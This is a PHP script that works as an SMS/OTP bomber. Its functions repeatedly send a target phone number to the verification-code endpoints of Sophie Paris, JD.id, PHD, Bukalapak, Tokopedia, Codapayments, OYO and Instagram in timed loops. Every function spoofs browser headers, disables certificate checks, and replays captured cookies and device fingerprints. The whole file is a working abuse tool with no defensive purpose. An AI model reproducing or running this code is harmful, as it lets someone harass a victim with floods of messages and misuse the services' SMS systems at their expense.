<?php
function sophie($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.sophieparis.com/iregistration/index/resendHpValidationCode/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"hp=".$no."");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate");
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.sophieparis.com/iregistration/member/revalidatesms/');
 $headers = array(); 
 $headers[] = "Authority: www.sophieparis.com";
 $headers[] = "Accept: */*";
 $headers[] = "X-Newrelic-Id: VQ8HV15WCBABV1RWDgcGUVM=";
 $headers[] = "Sec-Fetch-Dest: empty";
 $headers[] = "X-Requested-With: XMLHttpRequest"; 
 $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36";
 $headers[] = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"; 
 $headers[] = "Origin: https://www.sophieparis.com";
 $headers[] = "Sec-Fetch-Site: same-origin"; 
 $headers[] = "Sec-Fetch-Mode: cors"; 
 $headers[] = "Accept-Language: en-US,en;q=0.9"; 
 $headers[] = "Cookie: _ga=GA1.3.1653073049.1583108686; _gid=GA1.3.1507369321.1583108686; _hjid=c27f2024-b259-41fa-9ce9-73d8b5571b8f; toky_state=minimized; ins-gaSSId=e59f405d-6429-96d0-9eaf-2b92b66527a9_1583108691; _hjIncludedInSample=1; scarab.visitor=%222EAF352B0D1C530F%22; _fbp=fb.1.1583108698613.1373126036; frontend_cid=pimZ7VtcIRKBM2oi; am_promo_notification=0; frontend=laskgth5m8mkqfhjclgsilv9f0; MGT_NO_CACHE=1; insdrSV=11";
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 
		$server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
 }   
}
function jdid($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&code=");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://passport.jd.id/register/phone');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
function phd($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.phd.co.id/en/users/sendOTP");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone_number=".$no);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.phd.co.id/en/users/createnewuser');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
 }   
}
function bl($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.bukalapak.com/trusted_devices/otp_request");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"feature_tag=phone_registration&manual_phone=".$no."&channel=SMS&device_fingerprint=aa56c4da9da11b301ca0510aceae450c");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.bukalapak.com/register/phone_verification');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
 }   
}
function tokped($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://accounts.tokopedia.com/otp/c/ajax/request-wa");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"tk=50aca023f8e5bd57ffd73dba6984ed56&otp_type=116&msisdn=".$no."&email=&original_param=&user_id=&signature=&number_otp_digit=4&fingerprint_id=44460ef2082345f2af7ec366e99e4a0bee11ff743ea6ef101c50870e3f3a8f3f&fingerprint_data=eyJ1c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgwLjAuMzk4Ny4xMjIgU2FmYXJpLzUzNy4zNiIsImxhbmd1YWdlIjoiaWQtSUQiLCJjb2xvcl9kZXB0aCI6IjI0Iiwic2NyZWVuX3Jlc29sdXRpb24iOiI3Njh4MTM2NiIsInRpbWVfem9uZSI6Ii00MjAiLCJzZXNzaW9uX3N0b3JhZ2UiOiJ0cnVlIiwibG9jYWxfc3RvcmFnZSI6InRydWUiLCJpbmRleGVkX2RiIjoidHJ1ZSIsImRvY3VtZW50X2JvZHkiOiJ1bmRlZmluZWQiLCJvcGVuX2RhdGFiYXNlIjoiZnVuY3Rpb24iLCJjcHVfY2xhc3MiOiJ1bmRlZmluZWQiLCJwbGF0Zm9ybSI6IldpbjMyIiwiZG9fbm90X3RyYWNrIjoiMSIsInBsdWdpbiI6IlEyaHliMjFsSUZCRVJpQlFiSFZuYVc0Nk9sQnZjblJoWW14bElFUnZZM1Z0Wlc1MElFWnZjbTFoZERvNllYQndiR2xqWVhScGIyNHZlQzFuYjI5bmJHVXRZMmh5YjIxbExYQmtabjV3WkdZN1EyaHliMjFsSUZCRVJpQldhV1YzWlhJNk9qbzZZWEJ3YkdsallYUnBiMjR2Y0dSbWZuQmtaanRPWVhScGRtVWdRMnhwWlc1ME9qbzZPbUZ3Y0d4cFkyRjBhVzl1TDNndGJtRmpiSDRzWVhCd2JHbGpZWFJwYjI0dmVDMXdibUZqYkg0PSIsImNhbnZhcyI6Im5JNVBNdm5STllVMWlQYTIrS3dUeUFEVGRFZ1RQV3dhS1NxMzQzd3BCWEU9In0%3D");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		$headers = array(); 
 $headers[] = "Accept: application/json, text/javascript, */*; q=0.01";
 $headers[] = "accept-encoding: gzip, deflate, br";
 $headers[] = "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,tr;q=0.6";
 $headers[] = "content-length: 1184";
 $headers[] = "content-type: application/x-www-form-urlencoded; charset=UTF-8";
 $headers[] = "cookie: _SID_Tokopedia_=7JFd8D_2_HSxkIaNZaOD1TKFBChmlJj004AyylUji0eNm0Hxq6RPYJKMKFn6U1iD5UVCl_WwxAtU8zRBoNFY8CDMxkmyPuvdP9Y-1y68Ays4JD9KKrVF84Fq583E6u86; state=eyJyZWYiOiJodHRwczovL3d3dy50b2tvcGVkaWEuY29tIiwidXVpZCI6ImNjMmUwZjE3LTI2NDMtNDYxMS04NjM1LWQ3Y2IyMmVkYjZiMCIsInAiOiJodHRwczovL3d3dy50b2tvcGVkaWEuY29tIn0; bm_sz=D68FA9AB9EDD1D69FD4B413F75E01588~YAAQlgcFch3PFWVwAQAAeuczmgYpU9kuIK9xwpNVWptGnXJxSbyh/D4UiaHDYSPjz9VZ2Yk0VNba1WQC2vlQkv3QyghC0W3Rc6u/tWVIwa3hHvBdRd/ddPN2DQiB+tHPDgO+TnlyhH5QFSkr9e+vFUFkN1hZIiWazb8LC9BDAslLFolY67QSCNB86xverCN5ngPK; DID=75743adb2256af30e2d92cb0563f3cba826e3d1ff5649397c78f446ca85d0c01a5efe8b1100f34427d453e32b574d1cb; _gcl_au=1.1.1400449049.1583135059; _ga=GA1.2.256083859.1583135060; _gid=GA1.2.1870524604.1583135060; CSHLD_SID=59f76d66caeaaca3056f4b0f137c8429d50fed1b3460dc916d985722693bc27f; __asc=80f4a4371709a33f31ea40f16ca; __auc=80f4a4371709a33f31ea40f16ca; _abck=3651A181EB0EBA248B412B1054FA9E74~0~YAAQlgcFclTPFWVwAQAARPszmgMsBeY2setMCRZ8IYWtfYTgE2O4nHUGAGf2X09Fjv6Zh5lHuH2TlenqspgfE0hQHeKlqKMSl40sIj1/Qt7NSpQq4ssqTsFhAmFF85WB3PjhM3JVat6F9PvvwQ+j8IeSVen2dYlsDHFk2EPztuRt91W0sipwJ873ixzXPPCjDwSWHT/pCshx17XhpLjfxzmGgCG6wvoRxuRIFqUVd1IB9TDn7CXFAKjLONrQJGj0fOGE4LD3y+pySGFLjMKODQgAFgEkGr6Mcsigt4kczXahTRdAW/wHDC2zYJuLk31GW3zdvII0sTAPjw==~-1~-1~-1; ak_bmsc=F0FBCEE4CD8C97D61B54723D2A254A4472050796C947000051B95C5E9FD0EE13~plfKiKaJSKlvCRuf4iF1ihZtlIxhjmCihRX9cGSM9/mh8Q5LIUTTFa9e55wFEjWp08ByG1InVihi3M+WV8noQLiarZxA4ZtDxvR/A4QNp9VzFKs9m60uZXPw3anrpyJ3SntEptxUPb6S1/b/HNNN3w80CZO9R3hXKL9wpOBaAHoKK1liqcIvuUCpvaConTVZPEEnKXLc7Byhr7aDCZdTT+jW9zV7rZoV3DvoAA3ccrX5D0YiY/rwQqYAbn11j6oMio; bm_sv=69FC21FB76A1928A8F318F21ACCB2FB5~6xjgWgTDs4OXty3WF3AV9cB/yBVcqTrncdiOtT3rtWYxGPAiSytSwPEXsmQtRuwL2XuH4AklfR5JHrdiv0hplgUzDCv0kwr3Jge5CWIip9RjtYHpGXh4bbGIFnDeq5PWsxTgjhFbh1aqy41ASG3GnsttEV4Er/pgg/W5l0peH5U=; _gat=1; _ga=GA1.3.256083859.1583135060; _gid=GA1.3.1870524604.1583135060; ISID=%7B%22accounts.tokopedia.com%22%3A%22YWNjb3VudHMudG9rb3BlZGlhLmNvbQ%3D%3D.81c3227d516fb461aad7801518c41d40.1583135131024.1583135131024.1583135131024.1%22%7D; _dc_gtm_UA-9801603-1=1; _gat_UA-9801603-1=1; _hjid=de9dd843-2dab-446c-8ac2-75f16a04053f";
 $headers[] = "dnt: 1";
 $headers[] = "origin: https://accounts.tokopedia.com";
 $headers[] = "referer: https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=".$no."&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D085156104304%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D";
 $headers[] = "sec-fetch-dest: empty";
 $headers[] = "sec-fetch-mode: cors";
 $headers[] = "sec-fetch-site: same-origin";
 $headers[] = "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36";
 $headers[] = "x-requested-with: XMLHttpRequest";   
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 
 
    $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
 }   
}
function coda($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://airtime.codapayments.com/airtime/msisdn");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"TxnId=5829253780991263897&MnoId=22&submit_order=0&input_phone_number=".$no."");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://airtime.codapayments.com');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
 }   
}
function oyo($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.oyorooms.com/api/pwa/generateotp?phone=".$no."&country_code=%2B62&nod=4&locale=id");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&country_code=%2B62&nod=4&locale=id");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.oyorooms.com/login?country=id&retUrl=/id');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
 }   
}
function ig($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://www.instagram.com/accounts/send_signup_sms_code_ajax/");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"client_id=XllvGAALAAF9bX62AWCcGmbRYvil&phone_number=".$no."&phone_id=&big_blue_token=");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'https://www.instagram.com/');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
 }   
}
?>

